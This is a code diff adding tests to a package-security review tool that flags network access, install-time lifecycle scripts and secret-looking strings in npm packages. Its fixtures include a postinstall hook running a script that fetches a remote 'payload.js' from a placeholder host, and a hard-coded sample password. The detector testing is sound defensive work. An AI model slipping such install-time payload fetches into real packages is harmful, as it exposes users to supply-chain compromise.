@@ -94,6 +94,115 @@ describe("review", () => {
     expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
   });
 
+  test("does not flag unchanged network-only code paths", () => {
+    const previous = [
+      {
+        path: "link/http/createSignalIfSupported.js",
+        size: 90,
+        sha256: "apollo-http",
+        flags: [],
+        textSample: "export function createSignalIfSupported() {\n  return fetch('/graphql');\n}\n",
+      },
+    ];
+    const staged = [...previous];
+    const findings = deterministicFindings(staged, createPackageDiff(previous, staged), {
+      name: "@apollo/client",
+      version: "4.2.0",
+    });
+
+    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
+  });
+
+  test("flags added network-only code paths as contextual", () => {
+    const staged = [
+      {
+        path: "lib/update.js",
+        size: 90,
+        sha256: "network-only",
+        flags: [],
+        textSample:
+          "import https from 'https';\nhttps.request('https://example.invalid/payload').end();\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "code.network-access",
+          severity: "medium",
+          file: "lib/update.js",
+        }),
+      ]),
+    );
+  });
+
+  test("still flags network-capable lifecycle script files", () => {
+    const staged = [
+      {
+        path: "package.json",
+        size: 80,
+        sha256: "pkg",
+        flags: [],
+        textSample: JSON.stringify({ scripts: { postinstall: "node scripts/install" } }),
+      },
+      {
+        path: "scripts/install.js",
+        size: 90,
+        sha256: "install",
+        flags: [],
+        textSample: "fetch('https://example.com/payload.js');\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "code.network-access",
+          severity: "high",
+          file: "scripts/install.js",
+        }),
+      ]),
+    );
+  });
+
+  test("does not flag secret-looking source map content", () => {
+    // The tar parser strips text samples from .map files (shouldSkipTextSample),
+    // so deterministic rules never see source-map contents.
+    const staged = [
+      {
+        path: "core/index.js.map",
+        size: 120,
+        sha256: "map",
+        flags: ["text-sample-skipped"],
+      },
+      {
+        path: "config.js",
+        size: 80,
+        sha256: "secret",
+        flags: [],
+        textSample: "export const config = { password: 'abc!def@ghi#jkl' };\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(
+      findings.some(
+        (finding) =>
+          finding.ruleId === "file.secret-content" && finding.file === "core/index.js.map",
+      ),
+    ).toBe(false);
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "file.secret-content",
+          file: "config.js",
+        }),
+      ]),
+    );
+  });
+
   test("does not treat importlib.metadata as Python dynamic evaluation", () => {
     const staged = [
       {
